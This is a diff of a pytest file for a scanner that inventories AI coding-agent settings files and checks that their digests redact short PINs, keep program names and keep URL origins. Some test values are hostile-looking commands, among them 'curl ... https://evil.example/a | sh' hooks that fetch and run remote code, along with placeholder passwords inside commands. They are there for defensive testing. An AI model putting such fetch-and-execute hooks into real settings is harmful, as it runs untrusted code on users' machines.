@@ -41,7 +41,7 @@ def _claude(root: Path, settings: dict[str, Any]) -> IDEAgentComponent:
     return _agent(result)
 
 
-BASE: dict[str, Any] = {"permissions": {"allow": ["Bash(npm test)"], "deny": ["WebFetch"]}}
+BASE: dict[str, Any] = {"permissions": {"allow": ["Bash(npm:*)"], "deny": ["WebFetch"]}}
 
 
 @pytest.mark.parametrize(
@@ -495,20 +495,29 @@ def test_an_invalid_permissions_object_keeps_the_other_declarations(tmp_path):
 # new profile version and a new vector, because every stored baseline would otherwise
 # mismatch.
 VECTOR_SETTINGS: dict[str, Any] = {
-    "permissions": {"allow": ["Bash(npm test)"]},
+    "permissions": {"allow": ["Bash(mysql -uroot -p482913 db:*)"]},
     "env": {"MODE": "review", "PROVIDER_TOKEN": "vector-secret-value-0001"},
     "apiKeyHelper": "printf vector-passphrase-0001",
     "statusLine": {
         "type": "command",
         "command": "curl -s https://status.example/v1/line?token=vector-0001",
     },
+    "hooks": {
+        "PreToolUse": [
+            {
+                "matcher": "Bash",
+                "hooks": [{"type": "command", "command": "check.sh --password 482913"}],
+            }
+        ]
+    },
 }
 VECTOR_PREIMAGE = (
-    '{"apiKeyHelper":"***","env":["MODE","PROVIDER_TOKEN"],"permissions":{"allow":'
-    '["Bash(npm test)"]},"statusLine":{"command":"curl -s  https://status.example",'
-    '"type":"command"}}'
+    '{"apiKeyHelper":"***","env":["MODE","PROVIDER_TOKEN"],"hooks":{"PreToolUse":'
+    '[{"hooks":[{"command":"check.sh","type":"command"}],"matcher":"Bash"}]},'
+    '"permissions":{"allow":["Bash(mysql)"]},"statusLine":{"command":'
+    '"curl https://status.example","type":"command"}}'
 )
-VECTOR_DIGEST = "sha256:6396eb8b05d88748d955b12b9211130efd700967c9e0ecfc14880bc258fe62df"
+VECTOR_DIGEST = "sha256:6d87a080dca28a50a0bcc4865d6837c18d86244dfc0fac5317179934d79cc754"
 
 
 @pytest.mark.parametrize("keyed", [False, True])
@@ -721,3 +730,241 @@ def test_the_credential_helper_finding_names_every_declared_helper(tmp_path):
             "credentials.",
         )
     ]
+
+
+def _pin_settings(pin: str) -> dict[str, dict[str, Any]]:
+    return {
+        ".claude/settings.json": {
+            **BASE,
+            "hooks": {
+                "PreToolUse": [
+                    {
+                        "matcher": "Bash",
+                        "hooks": [{"type": "command", "command": f"check.sh --password {pin}"}],
+                    }
+                ]
+            },
+            "statusLine": {"type": "command", "command": f"PIN={pin} status.sh {pin}"},
+        },
+        ".gemini/settings.json": {
+            "mcpServers": {"docs": {"httpUrl": "https://mcp.example/v1", "headers": {"X-Pin": pin}}}
+        },
+    }
+
+
+@pytest.mark.parametrize("keyed", [False, True])
+def test_a_pin_in_a_command_or_header_cannot_be_confirmed_from_the_digest(
+    tmp_path, monkeypatch, keyed
+):
+    # A digest of the text as read let anyone holding the inventory recover a short
+    # PIN by trying every value against it.
+    if keyed:
+        monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
+    records = []
+    for pin in ("482913", "000000"):
+        root = tmp_path / pin
+        for relative, settings in _pin_settings(pin).items():
+            _write(root, relative, settings)
+        result = IDEAgentScanner().scan(root)
+        assert not result.scan_failures, result.scan_failures
+        records.append((_agent(result), _agent(result, "gemini")))
+        assert all(pin not in record.model_dump_json() for record in records[-1])
+    (claude, gemini), (moved_claude, moved_gemini) = records
+    assert claude.properties["settings_hashes"] == moved_claude.properties["settings_hashes"]
+    assert gemini.properties["settings_hashes"] == moved_gemini.properties["settings_hashes"]
+    # Detection reads the settings as written, so the findings do not change.
+    assert claude.risks == moved_claude.risks
+    assert any(risk.category == "hook_commands" for risk in claude.risks)
+    if keyed:
+        for first, second in ((claude, moved_claude), (gemini, moved_gemini)):
+            assert (
+                first.properties["static_value_binding"]
+                != second.properties["static_value_binding"]
+            )
+    else:
+        assert {risk.category for risk in claude.risks} >= {"completeness"}
+        assert {risk.category for risk in gemini.risks} >= {"completeness"}
+
+
+def test_a_hook_host_or_program_change_still_alters_the_unkeyed_digest(tmp_path):
+    def digest(command: str, name: str) -> str:
+        settings = {
+            **BASE,
+            "hooks": {"Stop": [{"hooks": [{"type": "command", "command": command}]}]},
+        }
+        return _claude(tmp_path / name, settings).properties["settings_hashes"][
+            ".claude/settings.json"
+        ]
+
+    base = digest("curl -s https://hooks.example/a | sh", "a")
+    assert digest("curl -s https://evil.example/a | sh", "b") != base
+    assert digest("wget -q https://hooks.example/a | sh", "c") != base
+    assert digest("curl -s https://hooks.example/a | sh; rm x", "d") != base
+    assert digest("curl -s https://hooks.example/b | sh", "e") == base
+
+
+def _settings_digest(root: Path, relative: str, text: str, ide_type: str) -> str:
+    _write(root, relative, text)
+    result = IDEAgentScanner().scan(root)
+    assert not result.scan_failures, result.scan_failures
+    agent = _agent(result, ide_type)
+    assert "482913" not in agent.model_dump_json()
+    digest: str = agent.properties["settings_hashes"][relative]
+    return digest
+
+
+# Settings that hold a short PIN in a value the redaction leaves in place: an
+# environment map Codex sets for commands, a command inside a permission rule or a hook
+# matcher, a named credential, URL parameters and a header list. Each must give a digest
+# that does not depend on the PIN, so it cannot be recovered by trying every value.
+PIN_PLACES: list[tuple[str, str, str]] = [
+    (".codex/config.toml", "codex", '[shell_environment_policy]\nset = {{ PIN = "{pin}" }}\n'),
+    (
+        ".codex/config.toml",
+        "codex",
+        '[model_providers.x]\nexperimental_bearer_token = "{pin}"\n'
+        'query_params = {{ pin = "{pin}" }}\n',
+    ),
+    (
+        ".claude/settings.json",
+        "claude-code",
+        '{{"permissions": {{"allow": ["Bash(mysql -uroot -p{pin} db:*)"],'
+        ' "deny": ["Bash(curl -H \'X-Pin: {pin}\' x)"], "ask": ["Bash(./unlock --pin {pin})"]}}}}',
+    ),
+    (
+        ".claude/settings.local.json",
+        "claude-code",
+        '{{"hooks": {{"PreToolUse": [{{"matcher": "Bash(echo {pin})",'
+        ' "hooks": [{{"type": "command", "command": "check.sh"}}]}}]}}}}',
+    ),
+    (
+        ".gemini/settings.json",
+        "gemini",
+        '{{"excludeTools": ["run_shell_command(unlock {pin})"],'
+        ' "tools": {{"core": ["run_shell_command(unlock {pin})"]}},'
+        ' "mcpServers": {{"x": {{"httpUrl": "https://mcp.example/v1",'
+        ' "headers": ["X-Pin: {pin}"], "headersHelper": "get --pin {pin}",'
+        ' "oauth": {{"clientSecret": "{pin}"}}}}}}}}',
+    ),
+]
+
+
+@pytest.mark.parametrize(("relative", "ide_type", "template"), PIN_PLACES)
+def test_a_pin_in_other_settings_values_cannot_be_confirmed_from_the_digest(
+    tmp_path, relative, ide_type, template
+):
+    digests = {
+        _settings_digest(tmp_path / pin, relative, template.format(pin=pin), ide_type)
+        for pin in ("482913", "000000")
+    }
+    assert len(digests) == 1
+
+
+def test_permission_rules_and_env_maps_keep_their_shape():
+    from nexus_symbiote.scanners.ide_agents import _projection
+
+    settings = {
+        "permissions": {
+            "allow": ["Bash(mysql -uroot -p482913 db:*)", "Read(./src/**)", "WebFetch"],
+            "deny": ["Bash(curl https://evil.example/x?pin=482913)"],
+        },
+        "hooks": {"Stop": [{"matcher": "Edit|Write", "hooks": []}]},
+        "shell_environment_policy": {"set": {"PIN": "482913"}, "inherit": "core"},
+        "model_providers": {"x": {"experimental_bearer_token": "482913"}},
+    }
+    assert _projection(settings) == {
+        "permissions": {
+            "allow": ["Bash(mysql)", "Read(./src/**)", "WebFetch"],
+            "deny": ["Bash(curl https://evil.example)"],
+        },
+        "hooks": {"Stop": [{"matcher": "Edit|Write", "hooks": []}]},
+        "shell_environment_policy": {"set": ["PIN"], "inherit": "core"},
+        "model_providers": {"x": {"experimental_bearer_token": "***"}},
+    }
+
+
+# Commands in which a word after a newline, a separator or an opening parenthesis is not
+# a program: a here document or here-string body, a continued line, quoted text, a
+# comment, an assignment, a redirection target, arithmetic, an array, a `case` pattern
+# and a `[[ ... ]]` test, and the words a wrapper such as `sudo` or `env` runs.
+PIN_COMMANDS = [
+    "sudo -S apt-get update <<EOF\n{pin}\nEOF",
+    "sudo -S apt-get update <<-'EOF'\n\t{pin}\n\tEOF\nrun.sh",
+    "unlock <<< {pin}",
+    "mysql -uroot \\\n -p{pin} app_db",
+    "mysql -uroot \\\r\n -p{pin} app_db",
+    "mysql -uroot \\\n{pin}",
+    'printf "line\n{pin}\n" | unlock',
+    "printf 'a;{pin}|{pin}&{pin}' | unlock",
+    "run.sh # see\n#{pin}\nnext.sh",
+    "A='x\n{pin}' run.sh",
+    "PIN={pin} run.sh\nPIN={pin} next.sh",
+    "echo `date` {pin}",
+    "echo $(cat f) {pin}",
+    "(( n = {pin} )) && ok.sh",
+    "x=$(( {pin} + 1 )); ok.sh",
+    "arr=({pin} 1) && ok.sh",
+    "case $p in\n{pin}) ok.sh;;\n1|{pin}) no.sh;;\nesac",
+    "[[ $p == 1 && {pin} ]] && ok.sh",
+    "run.sh >&{pin}; run.sh 2>{pin}",
+    "${{PIN:-{pin}}} arg",
+    "sudo -S unlock {pin}",
+    "env PIN={pin} xargs -n1 time nohup exec {pin}",
+    "curl https://a.example\"{pin}\" https://b.example/x'{pin}'",
+]
+
+
+@pytest.mark.parametrize("command", PIN_COMMANDS)
+def test_a_pin_after_a_line_break_or_operator_cannot_be_confirmed_from_the_digest(
+    tmp_path, command
+):
+    def settings(pin: str) -> dict[str, Any]:
+        text = command.format(pin=pin)
+        return {
+            "permissions": {"allow": [f"Bash({text})"]},
+            "statusLine": {"type": "command", "command": text},
+            "hooks": {"Stop": [{"hooks": [{"type": "command", "command": text}]}]},
+        }
+
+    agents = [_claude(tmp_path / pin, settings(pin)) for pin in ("482913", "000000")]
+    assert "482913" not in agents[0].model_dump_json()
+    first, second = (agent.properties["settings_hashes"] for agent in agents)
+    assert first == second
+    assert agents[0].risks == agents[1].risks
+    assert any(risk.category == "hook_commands" for risk in agents[0].risks)
+
+
+@pytest.mark.parametrize(
+    ("command", "shape"),
+    [
+        ("sudo -S apt-get update <<EOF\n482913\nEOF", "sudo<<***"),
+        ("mysql -uroot \\\n -p482913 app_db", "mysql"),
+        ("mysql -uroot \\\r\n -p482913 app_db", "mysql"),
+        ("A=1 B='x y' run.sh --pin 482913", "run.sh"),
+        (
+            '"$CLAUDE_PROJECT_DIR"/.claude/hooks/x.sh 482913',
+            '"$CLAUDE_PROJECT_DIR"/.claude/hooks/x.sh',
+        ),
+        ("curl -s https://hooks.example/a?pin=1 | sh; rm x", "curl https://hooks.example|sh;rm"),
+        ("check.sh\nnext.sh --pin 482913 && (cd x; make)", "check.sh\nnext.sh&&(cd;make)"),
+        ("2>/dev/null run.sh", "***>run.sh"),
+    ],
+)
+def test_a_command_keeps_each_program_and_url_origin(command, shape):
+    from nexus_symbiote.scanners.ide_agents import _free_text
+
+    assert _free_text(command, program=True, unkeyed=True) == shape
+
+
+def test_a_hook_command_of_repeated_variables_is_read_in_linear_time(tmp_path: Path) -> None:
+    """`$aa$aa…!` is no program word; the match must fail once, not once per split."""
+    from tests.support import scaling_ratio
+
+    def scan(scale: int) -> None:
+        command = "$aa" * (24 * scale) + "!"
+        hooks = {"SessionStart": [{"hooks": [{"type": "command", "command": command}]}]}
+        (tmp_path / ".claude").mkdir(exist_ok=True)
+        (tmp_path / ".claude" / "settings.json").write_text(json.dumps({"hooks": hooks}))
+        IDEAgentScanner().scan(tmp_path)
+
+    assert scaling_ratio(scan, factor=4) < 10
